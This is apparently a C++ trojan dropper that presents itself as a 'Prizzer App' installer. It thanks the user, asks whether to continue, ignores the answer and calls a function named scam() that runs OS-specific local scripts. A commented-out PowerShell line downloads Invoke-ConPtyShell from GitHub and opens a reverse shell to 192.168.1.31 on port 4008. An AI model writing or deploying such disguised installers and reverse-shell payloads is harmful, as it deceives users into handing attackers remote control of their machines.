#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include<unistd.h>

using namespace std;


string getOsName()
{
    #ifdef _WIN32
    return "Windows";
    #elif _WIN64
    return "Windows";
    #elif __APPLE__ || __MACH__
    return "Mac OSX";
    #elif __linux__
    return "Linux";
    #elif __FreeBSD__
    return "FreeBSD";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}     

void scam() {
    if (getOsName() == "Windows") {
        execl("./script-windows.sh","script-windows.sh",(char*)0);
        // system("& \"IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.31 4008\" p1");
    }
    else if (getOsName() == "Linux") {
        execl("./script-linux.sh","script-linux.sh",(char*)0);
    }
}



int main() {

    int choice;
    cout << "Thanks for downloading Prizzer App" << endl;
    cout << "Do you want to continue [Y/n]?: ";
    cin >> choice;
    
    scam();

    return 0;
};


